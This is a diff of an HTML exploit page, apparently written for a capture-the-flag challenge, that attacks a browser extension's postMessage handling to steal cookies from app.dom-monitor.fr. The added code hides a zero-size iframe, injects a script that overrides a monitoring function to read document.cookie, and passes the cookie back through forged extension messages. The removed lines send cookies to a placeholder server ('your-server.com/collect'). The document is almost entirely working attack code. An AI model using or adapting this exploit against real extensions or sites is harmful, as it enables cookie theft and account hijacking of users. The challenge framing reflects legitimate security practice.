@@ -5,43 +5,51 @@
 </head>
 <body>
   <div id="start">Click to start</div>
+  <iframe id="targetFrame" src="https://app.dom-monitor.fr" style="width:0;height:0;border:none;"></iframe>
+  
   <script>
-    // Function to steal cookies and exfiltrate
-    function stealCookies() {
-      // Get all cookies
-      const cookies = document.cookie;
-      // Send them to your server
-      fetch('https://your-server.com/collect?cookies=' + encodeURIComponent(cookies));
+    // Function to handle the start button click
+    document.getElementById('start').addEventListener('click', function() {
+      console.log("Starting exploit...");
       
-      // Or display them (for testing)
-      console.log("Cookies:", cookies);
-    }
-    
-    // The extension injects itself into every page
-    // Wait for it to load, then exploit the message passing
-    setTimeout(() => {
-      // This message will be processed by the extension
-      window.postMessage({
-        action: "update_counts",
-        counts: {
-          fetch: 0,
-          innerHTML: 0,
-          setAttribute: 0,
-          eval: 0
-        },
-        resourceCounts: {
-          script: 0,
-          img: 0,
-          stylesheet: 0,
-          font: 0,
-          other: 0
+      // Step 1: Create a script that will extract cookies when injected
+      const cookieExtractorCode = `
+        // This will run in the context of app.dom-monitor.fr via the extension
+        // Override the window.postMessage to intercept cookie data
+        const originalStartMonitoring = window.startMonitoring;
+        window.startMonitoring = function() {
+          // Get the cookie we want
+          const cookies = document.cookie;
+          console.log("Cookies found:", cookies);
+          
+          // Send it back via the extension's messaging
+          window.postMessage({
+            action: "update_counts",
+            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
+            stolenCookie: cookies  // Add the cookie as an extra property
+          }, "*");
+          
+          return originalStartMonitoring.apply(this, arguments);
+        };
+      `;
+      
+      // Step 2: Try to inject our code via various methods that might execute in the iframe
+      // Since CSP is removed, we can try script injection
+      const scriptElem = document.createElement('script');
+      scriptElem.textContent = cookieExtractorCode;
+      document.body.appendChild(scriptElem);
+      
+      // Step 3: Set up a listener to receive the data
+      window.addEventListener("message", function(message) {
+        console.log("Message received:", message.data);
+        if (message.data && message.data.stolenCookie) {
+          console.log("SUCCESS! Cookie data:", message.data.stolenCookie);
+          // Display the cookie for the challenge
+          document.body.innerHTML = `<h1>Flag found: ${message.data.stolenCookie}</h1>`;
         }
-        // The extension forwards the message with domain: event.origin to the background script
-      }, "*");
-      
-      // Now try to access any cookies
-      stealCookies();
-    }, 1000);
+      });
+    });
   </script>
 </body>
 </html>
